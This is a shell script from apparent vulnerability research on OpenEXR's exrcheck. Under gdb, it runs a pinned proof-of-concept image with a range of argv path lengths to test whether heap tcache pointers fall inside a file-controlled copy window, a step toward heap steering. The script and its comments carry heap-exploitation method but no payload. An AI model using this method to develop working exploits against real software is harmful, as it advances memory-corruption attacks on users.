#!/bin/sh
# W189: does argv path length put a live tcache next pointer inside the
# 384-byte file-chosen copy window of UNMODIFIED exrcheck -c?
#
# Same pinned W184 PoC bytes for every path; OpenEXRCore's context copies the
# filename into a heap string, so the path length is a real heap-layout knob.
# tcache-reach.cmd prints every tcache user pointer in dst+0..dst+384 at the
# sink.  A nonempty hits list would reopen file-chosen tcache steering in an
# unmodified consumer (still rung 4, NOT rung 5).  No code pointer, command,
# marker, wire or witness verdict is claimed.
set -eu
cd "$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
mkdir -p work-mixed/layout evidence

BASE=work-mixed/baseline_deep_mixed.exr
C1=work-mixed/w188-c1.exr
bin-vuln-plain/gen_baseline_deep_mixed "$BASE" > /dev/null
python3 cases/make_poc_mixed_full.py "$BASE" "$C1" 64 0x5a 256 > /dev/null
test "$(sha256sum "$C1" | cut -d' ' -f1)" = \
    2ab3ea9751736720030d606cd3dd947dd000039da537a47bf822f1f18dd618f7
python3 harness/layout-sweep.py work-mixed/layout "$C1" work-mixed/layout/paths.txt

probe() { # label path
    label=$1; path=$2
    gdb -q -batch \
        -ex 'set pagination off' -ex 'set confirm off' \
        -ex 'set disable-randomization on' \
        -ex 'break sort2_4ByteChannels_tiled' -ex "run -c $path" \
        -x harness/tcache-reach.cmd build-vuln-plain/bin/exrcheck 2>&1 \
        | grep -E '^(BASE|TCACHE idx|FINISHED)' \
        | sed -E 's/(BASE=0x|tcache=0x)[0-9a-f]+/\1NORM/g' \
        > "evidence/tcache-layout-$label.out"
}

run_all() {
    probe short "$C1"
    while read -r n path; do
        probe "L$n" "$path"
    done < work-mixed/layout/paths.txt
}

run_all
summary=evidence/tcache-layout-summary.out
: > "$summary"
{
    echo '=== PASS 1'
    echo "SHORT $(grep '^TCACHE' evidence/tcache-layout-short.out)"
    while read -r n path; do
        echo "LEN=$n $(grep '^TCACHE' "evidence/tcache-layout-L$n.out")"
    done < work-mixed/layout/paths.txt
} >> "$summary"

# Sensitivity and integrity checks: the W188 short-path control must repeat,
# every probe must reach the sink, and no probe may be empty.
grep -Fqx 'TCACHE idx=7 size=0x90 n=1 head_off=+4288 hits=[]' \
    evidence/tcache-layout-short.out
while read -r n path; do
    test -s "evidence/tcache-layout-L$n.out"
    grep -Fqx 'FINISHED' "evidence/tcache-layout-L$n.out"
done < work-mixed/layout/paths.txt

sha256sum evidence/tcache-layout-*.out > work-mixed/w189-pass1.sha
run_all
sha256sum evidence/tcache-layout-*.out > work-mixed/w189-pass2.sha
diff -u work-mixed/w189-pass1.sha work-mixed/w189-pass2.sha

echo '=== RESULT'
cat "$summary"
hits=$(grep -h '^TCACHE' evidence/tcache-layout-*.out | grep -c 'hits=\[(' || true)
if [ "$hits" -eq 0 ]; then
    echo 'RESULT PASS (no tcache next pointer in copy window, 14 path lengths)'
else
    echo "RESULT COUNTEREXAMPLE (hits in $hits probes)"
fi
